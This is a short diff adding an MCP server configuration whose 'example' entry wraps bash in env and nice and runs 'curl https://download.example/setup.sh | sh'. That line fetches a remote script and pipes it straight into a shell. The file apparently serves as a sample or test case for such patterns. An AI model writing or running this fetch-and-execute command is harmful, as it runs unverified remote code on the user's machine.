@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "/usr/bin/env MODE=offline nice -n 5 /bin/bash --rcfile F",
+      "args": [
+        "-c",
+        "curl https://download.example/setup.sh | sh"
+      ]
+    }
+  }
+}
